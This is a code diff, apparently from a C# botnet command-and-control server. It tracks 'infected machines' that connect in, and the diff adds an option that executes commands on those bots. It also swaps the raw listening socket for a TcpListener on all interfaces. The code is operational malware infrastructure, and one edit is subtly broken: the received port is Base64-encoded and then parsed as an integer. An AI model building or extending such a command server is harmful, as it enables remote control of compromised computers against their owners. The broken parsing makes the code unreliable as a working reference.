@@ -20,7 +20,7 @@ namespace Server.CnC_Server
     public class Server
     {
         private readonly int ServerPort;
-        private Socket ServerSocket;
+        private TcpListener ServerListener;
 
         private static List<Infected_Machine> Bots = new List<Infected_Machine>();
 
@@ -45,13 +45,14 @@ namespace Server.CnC_Server
             { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintAnalyzes_Option)).OptionName, new PrintAnalyzes_Option(Analyzes) },
             { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBotAnalysis_Option)).OptionName, new PrintBotAnalysis_Option(Bots, Analyzes) },
             { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBotStatus_Option)).OptionName, new PrintBotStatus_Option(Bots) },
-            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName, new Help_Option(Options) }
+            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Execute_Option)).OptionName, new Execute_Option(Commands, Bots) }
         };
 
         public Server(int serverPort)
         {
             this.ServerPort = serverPort;
-            this.ServerSocket = null;
+            this.ServerListener = null;
+            Options.Add(ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName, new Help_Option(Options));
         }
 
         public void Start()
@@ -89,22 +90,9 @@ namespace Server.CnC_Server
         {
             try
             {
-                // Establish the local endpoint for the socket.
-                // Dns.GetHostName returns the name of the host running the application.
-                IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
-                IPAddress ipAddr = ipHost.AddressList[0];
-                IPEndPoint localEndPoint = new IPEndPoint(ipAddr, ServerPort);
+                this.ServerListener = new TcpListener(IPAddress.Any, ServerPort);
 
-                // Creation TCP/IP Socket using socket Class Costructor
-                this.ServerSocket = new Socket(ipAddr.AddressFamily,
-                             SocketType.Stream, ProtocolType.Tcp);
-
-                // Using Bind() method we associate a network address to the server socket
-                // All client that will connect to this server socket must know this network address
-                this.ServerSocket.Bind(localEndPoint);
-
-                // Using Listen() method we create the client list that will want to connect to server
-                this.ServerSocket.Listen(10);
+                this.ServerListener.Start();
             }
             catch(Exception)
             {
@@ -116,14 +104,14 @@ namespace Server.CnC_Server
         {
             try
             {
-                Socket clientSocket = this.ServerSocket.Accept();
+                Socket clientSocket = this.ServerListener.AcceptSocket();
                 
                 // Data buffer 
                 byte[] bytes = new byte[1024];
 
                 // Receive client port
                 int numByte = clientSocket.Receive(bytes);
-                string clientPort = Encoding.ASCII.GetString(bytes, 0, numByte);
+                string clientPort = Convert.ToBase64String(bytes, 0, numByte);
 
                 // Create new infected machine object with the bot ip and port
                 Infected_Machine newBot = new Infected_Machine((clientSocket.RemoteEndPoint as IPEndPoint).Address.ToString(), int.Parse(clientPort));
